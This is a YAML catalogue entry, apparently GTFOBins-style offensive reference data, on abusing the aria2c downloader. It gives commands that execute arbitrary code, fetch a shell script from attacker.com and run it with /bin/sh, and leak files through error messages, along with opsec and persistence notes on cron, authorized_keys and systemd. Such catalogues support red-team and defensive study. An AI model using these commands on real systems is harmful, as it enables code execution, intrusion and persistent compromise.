---
name: aria2c
capabilities:
- exec
- read
- download
required_permissions:
  level: user
difficulty: low
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  - Process arguments visible in ps and auditd
  - Outbound network traffic to attacker host
  notes: ''
persistence_potential: true
examples:
- id: command
  description: Execute an arbitrary command.
  capabilities:
  - exec
  command: |-
    echo /path/to/command >/path/to/temp-file
    chmod +x /path/to/temp-file
    aria2c --on-download-error=/path/to/temp-file http://some-invalid-domain
  notes: Note that the subprocess is immediately sent to the background.
- id: command-2
  description: Execute an arbitrary command.
  capabilities:
  - exec
  command: aria2c --allow-overwrite --gid=aaaaaaaaaaaaaaaa --on-download-complete=/bin/sh http://attacker.com/aaaaaaaaaaaaaaaa
  notes: The remote file `aaaaaaaaaaaaaaaa` (must be a string of 16 hex digit) contains the shell script, e.g., `/path/to/command`. Note that said file needs to be written on disk in order to be executed. `--allow-overwrite` is needed if this is executed multiple times with the same GID.
- id: download
  description: Fetch a remote file to disk.
  capabilities:
  - download
  command: aria2c -o /path/to/ouput-file http://attacker.com/path/to/input-file
  notes: Use `--allow-overwrite` if needed. Similarly `-o /path/to/ouput-file` can be omitted, in that case the file is saved to `input-file` in the current working directory.
- id: file-read
  description: Read an arbitrary file.
  capabilities:
  - read
  command: aria2c -i /path/to/input-file
  notes: The file is leaked as error messages.
references:
- https://gtfobins.github.io/gtfobins/aria2c/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
